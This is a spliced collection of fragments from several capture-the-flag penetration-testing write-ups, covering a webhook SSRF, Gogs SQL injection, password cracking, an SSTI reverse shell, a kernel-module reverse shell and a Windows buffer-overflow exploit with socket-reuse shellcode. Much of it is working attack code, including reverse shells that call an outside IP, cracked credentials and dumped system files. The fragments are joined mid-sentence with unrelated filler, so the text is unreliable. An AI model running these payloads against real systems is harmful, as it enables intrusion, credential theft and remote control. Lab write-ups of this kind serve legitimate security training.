A: It stops at the first one it finds, reading $PATH left to right.\nQ: Is current directory included in the search when file is executed? A: If the current directory is in PATH then it is searched. Remember that an empty directory in PATH includes the current directory. e.g. PATH=:/usr/bin (leading empty) PATH=/usr/bin: (trailing empty) and PATH=/usr/bin::/bin (middle empty) will all effectively include current working directory."

The website allows us to configure a Webhook to check if a remote http service is available or not.\n\nMost likely we should find a way to exploit the webhook service, however I’d like to check if there are any vulnerabilities present first. Looking at the source code we find hints that Laravel is running, verify this by running webanalyze. If it’s an older version we know that this might be exploitable to “token Unserialize Remote Command Execution” or RCE through Laravel’s debugging feature.\n➜  webanalyze ./webanalyze -host http://health.htb\n :: webanalyze        : v1.0\n :: workers           : 4\n :: apps              : technologies.json\n :: crawl count       : 0\n :: search subdomains : true\n :: follow redirects  : false\n\nhttp://health.htb (0.1s):\n    Apache, 2.4.29 (Web servers)\n    Ubuntu,  (Operating systems)\n    Laravel,  (Web frameworks)\n    PHP,  (Programming languages)\nTo check if debugging is enabled visit http://10.129.9.180/profile and we see it’s not. Investigating the token unserialize RCE we need the app_key to exploit, something we cannot find at this point. Also, this is an older vulnerability that works on Laravel version 5.5.40 / 5.6.x &lt; 5.6.30, and visiting http://health.htb/webhook we find that they are running Laravel version 8.83.13.\nBack the the Webhook Service. Popularized by GitHub, Webhooks are the modern way for apps to receive notifications / events from other servers. A Webhook is a way for you to define a URL that is called by another service when a particular event occurs. For example, you can configure your repo on GitHub to have a Webhook that calls http://exploit.se/pr when a new Pull Request is created.\nIf we for example set the Webhook URL to:\nhttps://echo-webhook.exploit.se/SOMETHING_UNIQUE\nNow when the other service does its POST to that URL the request body is cached and can be retrieved via a GET to the same URL. Here is a simple cURL to demonstrate:\ncurl -H \"content-type: application/json\" -d '{\"foo\": \"bar\"}' https://echo-webhook.exploit.se/foobar\ncurl https://echo-webhook.exploit.se/foobar\n{\"foo\":\"bar\"}\nTranslated to this box, we set the Payload URL to where we want to receive data. We will get an incomming POST request, and either setup a nc listener or a webserver capable to receive POSTs.\nThe Monitored URL is what ever we want to retreive information from, after playing around with this parameter for a good while I noticed that I can bypass the restrictions on port 3000 by pointing to myself and having a 301 Redirect to http://127.0.0.1:3000\n\n➜  health python3 redirect.py 80 http://127.0.0.1:3000\n10.129.9.180 - - [23/Aug/2022 12:32:01] \"GET / HTTP/1.0\" 302 -\n\n➜  health nc -lvnp 8888                               \nlistening on [any] 8888 ...\nconnect to [10.10.14.20] from (UNKNOWN) [10.129.9.180] 59780\nPOST / HTTP/1.1\nHost: 10.10.14.20:8888\nAccept: */*\nContent-type: application/json\nContent-Length: 7663\nExpect: 100-continue\n\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\": \n[... snip ...] \ncontent=\\\"Gogs(Go Git Service) a painless self-hosted Git Service written in Go\\\"\n[... snip ...]\nid=\\\"footer-rights\\\"&gt;\\u00a9 2014 GoGits \\u00b7 Version: 0.5.5.1010 Beta\n\n\n\nReading about gogs version 0.5.5.1010 it’s vulnerable to SQL Injection through the search.\nThe PoC code isn’t working right of the bat, we’re returned \"health\":\"down\" indicating that the SQL syntax is broken somewhere.\nhttp://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/\nselect/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,\nnull,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from\n/**/mysql.db/**/where/**/('%25'%3D'\nPlaying around and trying to simplify I get simple ORDER BY to give some response:\n➜  health python3 redirect.py 80 \"http://127.0.0.1:3000/api/v1/users/search?q=')/**/order/**/by/**/27--/**/-\"\n10.129.9.180 - - [23/Aug/2022 16:10:00] \"GET / HTTP/1.0\" 302 -\n\n➜  health python3 webserv.py 8888\nINFO:root:POST request,\nPath: /\nHeaders:\nHost: 10.10.14.20:8888\nAccept: */*\nContent-type: application/json\nContent-Length: 575\n\n\n\nBody:\n{\"webhookUrl\":\"http:\\/\\/10.10.14.20:8888\\/\",\"monitoredUrl\":\"http:\\/\\/10.10.14.20\\/\",\"health\":\"up\",\"body\":\"{\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"}],\\\"ok\\\":true}\",\"message\":\"HTTP\\/1.0 302 Found\",\"headers\":{\"Server\":\"BaseHTTP\\/0.6 Python\\/3.10.5\",\"Date\":\"Tue, 23 Aug 2022 14:08:01 GMT\",\"Location\":\"http:\\/\\/127.0.0.1:3000\\/api\\/v1\\/users\\/search?q=')\\/**\\/order\\/**\\/by\\/**\\/20--\\/**\\/-\",\"Content-Type\":\"application\\/json; charset=UTF-8\",\"Set-Cookie\":\"_csrf=; Path=\\/; Max-Age=0\",\"Content-Length\":\"111\"}}\n\n10.129.9.180 - - [23/Aug/2022 16:08:00] \"POST / HTTP/1.1\" 200 -\nNOTE: {\\\"data\\\":[{\\\"username\\\":\\\"susanne\\\",\\\"avatar\\\":\\\"\\/\\/1.gravatar.com\\/avatar\\/c11d48f16f254e918744183ef7b89fce\\\"} is the exfiltrated data.

Username: susanne 2. Hash: 66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37 3. Salt: sO3XIbeW14\n\n\n\nDownloading the source code for Gogs 0.5.5 and looking for the password encoding function we find this on line 117:\n// gogs/models/user.go\nnewPasswd := base.PBKDF2([]byte(u.Passwd), []byte(u.Salt), 10000, 50, sha256.New)\nAs I see it we can solve this two different ways; 1. The programmatically simple solution where we make a script encode a string with the same algorithm and salt, and compare the end result to the found hash. 2. Or make a script that reformats hash + salt to hashcat format.\nSince I’m not a programmer, I chose to go with option one, knowing this will take far longer to crack as I’ll never build anything as efficient as hashcat. Googling around I found this post and used it as foundation for my script. I made some tweaks to import strings from list and fired it up:\n#!/usr/bin/python3\nimport hashlib\nimport binascii\n\ndef main():\n    salt = b'sO3XIbeW14'\n    iterations = 10000\n    count = 0\n    \n    ### ---=== START ===---\n    ##Segment for easy troubleshooting\n    #password = b'test'\n    #key = hashlib.pbkdf2_hmac(\"sha256\", password, salt, iterations, 50)\n    #print(key.hex())\n    #print(binascii.hexlify(key))\n    #pwcompare(key.hex(),password)\n    ### ---=== END ===---\n\n    file = input('Enter path to password file: ')\n    with open(file) as pw_file:\n        for passwd in pw_file:\n            s = passwd.rstrip()\n            pw_byte = bytes(s, encoding='utf-8')\n            key = hashlib.pbkdf2_hmac(\"sha256\", pw_byte, salt, iterations, 50)\n            count = count + 1\n            pwcompare(key.hex(),s,count)\n\ndef pwcompare(hex_key,password,count):\n    target_key = '66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37'\n    \n    ## Troubleshooting hash for b'test'\n    #target_key = 'fa21b095cfa6e55dff39c11c2ba8a75e7392a9a34f24207d10b38fcde7a0b252a38590631ca6acf3257c8a7edb7598498de9'\n    \n    if hex_key == target_key:\n        print(count,\"---=== Password is:\",password, \"===---\")\n        exit()\n    else:\n        print(count,\"- Testing password:\",password)\n\nif __name__ == \"__main__\":\n    main()\n➜  health ./decrypt.py\nEnter path to password file: /usr/share/wordlists/rockyou.txt   \n1 - Testing password: 123456\n2 - Testing password: 12345\n[... snip ...]\n70966 - Testing password: feilunhai\n70967 ---=== Password is: february15 ===---\nTest to login with cracked credentials and grab user.txt\n➜  health ssh susanne@health.htb\nsusanne@health.htb password: february15\n\nsusanne@health:~$ id && cat user.txt\nuid=1000(susanne) gid=1000(susanne) groups=1000(susanne)\na47815867df7df685c95bd170197d921\n\n\n\n# Root ### Step 1 As always, start with sudo -l to look for a easy privesc vector.\n\n\nNo dice. Do some manual enumeration and look for anything interesting in ~, /opt, /var/log, /var/www/, /tmp, /dev/shm or /\n\n\nThere doesn’t seem to be the case of password reuse, it might be a good idea to dump the database to find more hashes to crack but I think that’s to easy. Instead continue enumerating with pspy64 and/or linPEAS.\n\n\nEvery minute we see the same set of tasks:\n\n\nReading about TRUNCATE I find this: &gt; TRUNCATE TABLE empties a table completely. It requires the DROP privilege. &gt; Logically, TRUNCATE TABLE is similar to a DELETE statement that deletes all rows, or a sequence of DROP TABLE and CREATE TABLE statements.\n\n\nSo why are they truncating table tasks every minute, and what can we do with that information?\n\n\nIf would make sense that the webhook we create will be put in the tasks table. Create a new webhook/task from the webpage and verify.\n\n\nsql mysql&gt; use laravel Database changed mysql&gt; show tables; +------------------------+ | Tables_in_laravel      | +------------------------+ | failed_jobs            | | migrations             | | password_resets        | | personal_access_tokens | | tasks                  | | users                  | +------------------------+ mysql&gt; select * from tasks; +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | id                                   | webhookUrl               | onlyError | monitoredUrl        | frequency   | created_at          | updated_at          | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+ | 341fc709-d2c8-48e4-9c41-636656bdfad8 | http://10.10.14.20:8888/ |         0 | http://10.10.14.20/ | */1 * * * * | 2022-08-24 09:46:23 | 2022-08-24 09:46:23 | +--------------------------------------+--------------------------+-----------+---------------------+-------------+---------------------+---------------------+\n\n\n### Step 2 We know that we controll both webhookUrl and monitoredUrl, with the SQL access we are now able to bypass all restrictions from the webpage.

From the dump we can quickly see that a certificate has been sent from backdrop.carpediem.htb to the docker host on 172.17.0.1, I have no idea of what to do with this information.\n\nNext step took me embarrassingly long time to figure out - from our linpeas output we found a private SSH key.

NOTE: Change IP to 172.17.0.1 (docker0 interface of monitors.htb) and port to whatever you like.\nroot@8b08538ad9e7:/tmp# cat reverse-shell.c #include &lt;linux/kmod.h&gt; #include &lt;linux/module.h&gt; MODULE_LICENSE(“GPL”); MODULE_AUTHOR(“AttackDefense”); MODULE_DESCRIPTION(“LKM reverse shell module”); MODULE_VERSION(“1.0”); char* argv[] = {“/bin/bash”,“-c”,“bash -i &gt;& /dev/tcp/172.17.0.1/4488 0&gt;&1”, NULL}; static char* envp[] = {“PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin”, NULL }; static int __init reverse_shell_init(void) { return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC); } static void __exit reverse_shell_exit(void) { printk(KERN_INFO “Exiting”); } module_init(reverse_shell_init); module_exit(reverse_shell_exit);\nCreate the Makefile; root@8b08538ad9e7:/tmp# cat Makefile obj-m +=reverse-shell.o all: make -C /lib/modules/\\((shell uname -r)/build M=\\)(PWD) modules clean: make -C /lib/modules/\\((shell uname -r)/build M=\\)(PWD) clean\nNext we make the kernel module; root@8b08538ad9e7:/tmp/rev# make make -C /lib/modules/4.15.0-142-generic/build M=/tmp/rev modules make[1]: Entering directory ‘/usr/src/linux-headers-4.15.0-142-generic’ CC [M] /tmp/rev/reverse-shell.o gcc: error trying to exec ‘cc1’: execvp: No such file or directory make[2]: *** [scripts/Makefile.build:339: /tmp/rev/reverse-shell.o] Error 1 make[1]: *** [Makefile:1584: module/tmp/rev] Error 2 make[1]: Leaving directory ‘/usr/src/linux-headers-4.15.0-142-generic’ make: *** [Makefile:3: all] Error 2\ngcc cc1 was not found, and unfortunatley we are unable to fix this using ‘apt-get install –reinstall build-essential’.

This would in theory give us 500 C’s after EIP.\nb = '\\x41' * 66\nb += '\\x42' * 4\nb += '\\x43' * 500\nIf we load MyFirstApp.exe in x64dbg and fire the exploit, we see that at the point of crash, the stack pointer [$esp] is pointing to the area that directly follows the EIP overwrite - 0x0101FF18.\n\nAlthough we sent a total of 500 bytes in this position, this has been heavily truncated to only 10 bytes. This is a big problem, as this won’t suffice for the operations we wish to carry out. However, we do have the full 66 byte \\x41 island that precedes the EIP overwrite at our disposal. As long as we can pass execution into the 10 byte island that follows the overwrite, we can do a short jump back into the 66 byte island.\nAs the $esp register is pointing at the 10 byte island, the first thing we need to do is locate an executable area of memory that contains a jmp esp instruction which is unaffected by ASLR so we can reliably hardcode our exploit to return to this address.\nIn x64dbg, we can do this by inspecting the Memory Map tab and looking at what DLLs are being used. We find 5 DLL’s; msvcrt.dll, kernelbase.dll, kernel32.dll, ws2_32.dll & ntdll.dll. Take note of their respective base address, go to Log and run the command imageinfo &lt;base-dll-address&gt; to retrieve information from the PE header. If the DLL Characteristics flag is set to 0, no protection such as ASLR or DEP are enabled.\n\nThis step can also be done in Immunity using Mona and is much simpler, just write: !mona modules\n\n\nUnfortunate for us, all DLL’s are protected and we have to bypass ASLR somehow. We have two options..\n.. find a JMP ESP within the EXE itself. .. create your own malicious DLL and inject it into the program.\nThe easiest of the two would be to find a jump point within the EXE, so lets go with that.\nIn x64dbg go to Memory Map tab and double click on the memory section marked as executable (E in Protection column) for myfirstapp.exe; .text in this case.\n\nWe are sent to the CPU tab, here press CTRL+F and search for JMP ESP and we find 5 jump points. \n\nThis can also be done in Immunity using Mona by writing: !mona jmp -r esp -cpb \"\\x00\"\n\n\nSave the first address, 0x7190239F. Now that we have an address of a jmp esp instruction that will take us to the 10 byte island after the EIP overwrite, we can replace \\x42\\x42\\x42\\x42 in our exploit with said address (keep in mind, this needs to be in reverse order due to the use of little endian).\nOur updated code should now look like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\n\nip = \"172.30.1.118\"\nport = 9062\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"random-data\"\n\nb = '\\x41' * 66\nb += '\\x9F\\x23\\x90\\x71'\nb += '\\x43' * 500\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(s.recv(1024))\n    s.send(user)\n    print(s.recv(1024))\n    s.send(passwd)\n    print(s.recv(1024))\n    s.send(fullname)\n    print(s.recv(1024))\n    print(\"Sending evil buffer...\")\n    s.send(b)\n    print(\"Done!\")\nexcept:\n    print(\"Could not connect.\")\nBefore running the exploit again, set a breakpoint at our jmp esp instruction. Do so by going to the CPU tab, press CTRL+G and enter the address 7190239F. Toggle a breakpoint by pressing F2, or use any of the menus - once breakpoint is applied the address field should turn red.\nIf we now run the exploit again, we will hit the breakpoint and after stepping into the call (blue arrow pointing down on a dot), we will be taken to our 10 byte island of 0x43, meaning we control execution.\n\nNext we need to jump back to the start of the 66 byte island as mentioned earlier. To do this, we can use a short jump to go backwards. Rather than calculating the exact offset manually, x64dbg can do the heavy lifting for us here!\nIf we scroll up the CPU tab to find the start of the 66 byte island containing the \\x41 bytes, we can see there is a 0x41 at 0x00FCFED4 and also two which directly precede that.\n\nWe cannot copy the address of the first 2 bytes, but we can instead subtract 2 bytes from 0x00FCFED4 to get the address 0x00FCFED2. Now, if we go back to where $esp is pointing (0x00FCFF15) and press the space bar whilst the instruction is highlighted, we will enter the Assemble screen.\nIn here, we can enter jmp 0x00FCFED2, hit OK and it will automatically calculate the distance and create a short jump for us; in this case, EB BB. If everything went correct you should now have a red arrow pointing up to the start of the \\x41 island. You can also verify this by pressing G.\n\nWe can now update the exploit to include this instruction before the \\x43 island that was previously in place and replace the remaining bytes in both the 66 byte and 10 byte islands with NOP sleds so that we can work with them a bit easier later when we are assembling our exploit in the debugger.\nAfter making these changes, the exploit should look like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\n\nip = \"172.30.1.118\"\nport = 9683\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"random-data\"\n\nb = '\\x90' * 66                     # buffer\nb += '\\x9F\\x23\\x90\\x71'             # jmp esp ; within the exe\nb += '\\xEB\\xBB'                     # jmp 0x00FCFED2 ; start of \\x41 island\nb += '\\x90' * 500                   # NOP sleds\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(s.recv(1024))\n    s.send(user)\n    print(s.recv(1024))\n    s.send(passwd)\n    print(s.recv(1024))\n    s.send(fullname)\n    print(s.recv(1024))\n    print(\"Sending evil buffer...\")\n    s.send(b)\n    print(\"Done!\")\nexcept:\n    print(\"Could not connect.\")\nIf we execute the exploit again, we will now find ourselves in the 66 byte NOP sled that precedes the initial EIP overwrite: \n\n\n\nAnalysis & Socket Hunting\nThe first thing we need to do before we can start putting together any code is to figure out where we can find the socket that the data our exploit is sending is being received on. Restart the application and set a break point at the either the recv or call eax funtions under the string Input Your Code:, in my case that is 0x71901D79.\n\nAt the breakpoint we can see a few interesting things;\n\nThe recv function ontop of the stack, as seen in the red box on the right.\n\nLooking on these Windows Docs we see that the recv function looks like this:\nint recv(\n  SOCKET s,\n  char   *buf,\n  int    len,\n  int    flags\n);\n\nThe first argument (on the top of the stack) is the socket file descriptor; in this, case the value 0x130\nThe second argument is the buffer, i.e. a pointer to the area of memory that the data received via the socket will be stored. In this case, it will store the received data at 0x653C20\nThe third argument is the amount of data to expect. This has been set at 0x400 bytes (1024 bytes)\nThe final argument is the flags that influence the behaviour of the function. As the default behaviour is being used, this is set to 0\n\n\nWe can also see just above the breakpoint ebp-10 is moved to eax, and on the next instruction eax is moved onto the stack. This means that the socket descriptor is contained at ebp-10. We can confirm this in by searching for the address of ebp-10 (0x00eeff60) in the Dump tabs. This gives us a way to dynamically retrive the socket descriptor for our payload.\n\nTo get the offset calculate 00eeff60 (ebp-10) - 00eeff18 (esp) = 0x48\n\nFor future referenses we also need to grab the address of the recv function. We find this value by either double clicking call or by looking at eax in the top right corner - 0x7323a0.\nIf you press Step over from the breakpoint you’ll land on the next instruction (sub esp,10). Here you can confirm that your input data are in the buffer by searching for the buffer address (0x653c20) in the Dump tabs.\n\nNOTE : This last step has to be done quickly. If the value of EAX is set to FFFFFFFF (SOCKET_ERROR) when you reach sub esp,10 that means you were to slow and the socket has closed.\n\n\n\nWriting the Socket Stager\nDisclaimer: When finalizing this exploit at home the values of my binary differ from the one I had at work thus making some of the values different, although the calculation to get there are still the same. My distance for example is not 0x48 but instead 0x70. Also, the recv address changed from 0x76b323a0 to 0x75dc23a0.\nFollowing the guidlines from rastating we should get something like this:\npush esp                    -&gt; \\x54\npop eax                     -&gt; \\x58\nadd ax,0x70                 -&gt; \\x66\\x83\\xc0\\x70       # socket position\nsub esp,0x70                -&gt; \\x83\\xec\\x70           # gain space, to close to esp\nxor ebx,ebx                 -&gt; \\x31\\xdb\npush ebx                    -&gt; \\x53\nadd bh,0x4                  -&gt; \\x80\\xc7\\x04           # buffer size (0x400)\npush ebx                    -&gt; \\x53\npush esp                    -&gt; \\x54\npop ebx                     -&gt; \\x5b\nadd ebx,x64                 -&gt; \\x83\\xc3\\x64           # where to write payload\npush ebx                    -&gt; \\x53\npush dword ptr ds: [eax]    -&gt; \\xff\\x30\nmov eax,0x75dc23a0          -&gt; \\xa1\\xac\\x82\\x90\\x71   # recv address\ncall eax                    -&gt; \\xff\\xd0               # call recv\ncall ebx                    -&gt; \\xff\\xd3               # call payload\nAll the values can be translated to it’s respective hex values using either metasploit nasm_shell.rb or Immunity Debugger.\n\n\n\nFinalising the Exploit\nWith out stager ready, we place it at the start of the 66 byte NOP sled in our exploit. It’s important the stager doesn’t overwrite the 66-byte buffer, but in our case this is not a problem.\nAdditionally, we will make the exploit wait a few seconds before it sends the final payload, to ensure that our stager has executed.\nThe exploit should now look like this:\n#!/usr/bin/python\nimport socket\nimport os\nimport sys\n\nip = \"10.10.11.115\"\nport = 9999\nuser = \"alfiansyah\"\npasswd = \"K3r4j@@nM4j@pAh!T\"\nfullname = \"asdf\"\n\nstager = b'\\x90\\x90\\x90\\x90\\x54\\x58\\x66\\x83'    # NOP sequence | push esp | pop eax | add ax,0x70\nstager += b'\\xc0\\x70\\x83\\xec\\x70\\x31\\xdb\\x53'   # sub esp,0x70 | xor ebx,ebx | push ebx\nstager += b'\\x80\\xc7\\x04\\x53\\x54\\x5b\\x83\\xc3'   # add bh,0x4 | push ebx | push ep | pop ebx | add ebx,0x64\nstager += b'\\x64\\x53\\xff\\x30\\xa1\\xac\\x82\\x90'   # push ebx | push dword ptr ds: [eax] | mov eax,0x75dc23a0\nstager += b'\\x71\\xff\\xd0\\xff\\xd3'               # call eax | call ebx\n\nbuffer = stager\nbuffer += b'\\x90' * (66 - len(stager))\nbuffer += b'\\xa8\\x23\\x90\\x71'                   # jmp esp ; within the exe\nbuffer += b'\\xeb\\xb9\\x90\\x90'                   # jmp to stager ; start of 66-byte island\nbuffer += b'\\x90' * 500\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ntry:\n    s.connect((ip, port))\n    print(\"[+] Connected to target: 10.10.11.115:9999\")\n    s.recv(1024)\n    s.send(user)\n    s.recv(1024)\n    s.send(passwd)\n    s.recv(1024)\n    s.send(fullname)\n    s.recv(1024)\n    s.send(buffer)\n    print(\"[+] Sent stager, waiting 5 seconds...\")\nexcept:\n    print(\"[-] Could not connect.\")\nLastly we want to add a payload to the script.

Reading about Capabilities we find: &gt; Capabilities are useful when you want to restrict your own processes after performing privileged operations &gt; (e.g. after setting up chroot and binding to a socket). However, they can be exploited by passing them malicious &gt; commands or arguments which are then run as root.\nCAP_SETUID = Allow changing of the UID (set UID of root in you process) CAP_NET_BIND_SERVICE = Bind a socket to internet domain privileged ports CAP_NET_RAW = Use RAW and PACKET sockets (sniff traffic)\nWith this knowledge, python3.8 has the capabilities to setuid to 0, giving us root access.

If not I'll get Eddie to take a look over. Our security team had a concern with it - something about e-mail?\nAfter being stumped for a while, I’m starting to think that I missed something in my initial enumeration. I had yet to enumerate vhosts!\n┌──(void㉿void)-[/htb/bolt]\n└─$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://bolt.htb -H 'Host: FUZZ.bolt.htb'  -fl 505\n\ndemo                    [Status: 302, Size: 219, Words: 22, Lines: 4]\nmail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]\nTrying to login on mail.bolt.htb using credentials admin@bolt.htb:deadbolt gives the error Connection to storage server failed. rather then invalid password. As we don’t have any other users, lets move on to the demo vhost.\nHere we are able to create a new user - but we need a invite code. Following previous steps I begin to look in the image files for a hidden invite key. After some looking we a key in 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar –&gt; app/base/routes.py:\ndef register():\n    login_form = LoginForm(request.form)\n    create_account_form = CreateAccountForm(request.form)\n    if 'register' in request.form:\n\n        username  = request.form['username']\n        email     = request.form['email'   ]\n        code      = request.form['invite_code']\n        if code != 'XNSS-HSJW-3NGU-8XTJ':\n            return render_template('code-500.html')\n        data = User.query.filter_by(email=email).first()\n        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':\n            # Check usename exists\nCreate a new account.

After a while I notice that changing the username on demo.bolt.htb triggers a confirmation email from support@bolt.htb, to confirm the change. Maybe we can exploit this to with XSS to get a token, or even trigger a reverse shell?\n![[bolt-02.png]]\n![[bolt-03.png]]\nTrying different input results in nothing interesting, Javascript results in empty mails. After a lot of digging I tried SSTI and to my surprise it worked! {% raw %}{7*7}{% endraw %} results in a response mail with username 49:\n![[bolt-04.png]]\nInput: {% raw %}{7*'7'}{% endraw %} Output: 7777777\nFollowing the SSTI-chart we find that it’s most likely Jinja2, Twig or something unknown.\n![[bolt-05.png]]\n\n\n\nStep 5\nExploit the SSTI vulnerability to get file read, code execution and a reverse shell. Trying different payloads we can confirm that it’s Jinja2.\nFile read Input:  {% raw %}{ get_flashed_messages.__globals__.__builtins__.open(\"/etc/passwd\").read() }{% endraw %}\nOutput:\nroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin avahi-autoipd:x:109:116:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin usbmux:x:110:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:111:117:RealtimeKit,,,:/proc:/usr/sbin/nologin dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin cups-pk-helper:x:113:120:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin speech-dispatcher:x:114:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false avahi:x:115:121:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin saned:x:117:123::/var/lib/saned:/usr/sbin/nologin nm-openvpn:x:118:124:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin hplip:x:119:7:HPLIP system user,,,:/run/hplip:/bin/false whoopsie:x:120:125::/nonexistent:/bin/false colord:x:121:126:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:122:127::/var/lib/geoclue:/usr/sbin/nologin pulse:x:123:128:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin gnome-initial-setup:x:124:65534::/run/gnome-initial-setup/:/bin/false gdm:x:125:130:Gnome Display Manager:/var/lib/gdm3:/bin/false eddie:x:1000:1000:Eddie Johnson,,,:/home/eddie:/bin/bash systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin vboxadd:x:998:1::/var/run/vboxadd:/bin/false sshd:x:126:65534::/run/sshd:/usr/sbin/nologin mysql:x:127:133:MySQL Server,,,:/nonexistent:/bin/false clark:x:1001:1001:Clark Griswold,,,:/home/clark:/bin/bash postfix:x:128:134::/var/spool/postfix:/usr/sbin/nologin vmail:x:5000:5000::/var/mail:/usr/bin/nologin dovecot:x:129:136:Dovecot mail server,,,:/usr/lib/dovecot:/usr/sbin/nologin dovenull:x:130:137:Dovecot login user,,,:/nonexistent:/usr/sbin/nologin\nNone of the reverse payloads from Hacktricks worked for me, however I found another Jinja2 reverse a python shell that did work!\nInput:  {% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"10.10.14.10\\\",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\", \\\"-i\\\"]);'\")}}{%endif%}{% endfor %}{% endraw %}\nOutput:\n┌──(void㉿void)-[/htb/bolt]\n└─$ nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.10] from (UNKNOWN) [10.10.11.114] 48068\n/bin/sh: 0: can't access tty; job control turned off\n$ id && hostname\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nbolt.htb\n$ pwd\n/var/www/demo\nA quick look around and we see that user Eddie has mail.

Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning...\n\n-Clark\n\nPassbolt is a Open Source Password Manager, and from scouring the database we found both Clark and Eddies PGP Public key and some passwords.\nWhile looking for ways to recover Clark and Eddie’s accounts I came across this post. We extract the token and user_id from mysql and use it to access the recovery page. https://&lt;your_domain&gt;/setup/recover/&lt;user_id&gt;/&lt;token&gt;\n\nClark:\nmysql&gt; select user_id, token

quicky realize we need to supply a private key, something that we’ve yet to discover.\n![[Pasted image 20211112092547.png]]\n\n\n\n\nStep 2\nA quick grep for a BEGIN PGP PRIVATE and we find an

It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\nDIRB: + http://10.10.10.79/cgi-bin/ (CODE:403|SIZE:287) + http://10.10.10.79/decode (CODE:200|SIZE:552) ==&gt; DIRECTORY: http://10.10.10.79/dev/ + http://10.10.10.79/encode (CODE:200|SIZE:554) + http://10.10.10.79/index (CODE:200|SIZE:38) + http://10.10.10.79/index.php (CODE:200|SIZE:38) + http://10.10.10.79/server-status (CODE:403|SIZE:292)"

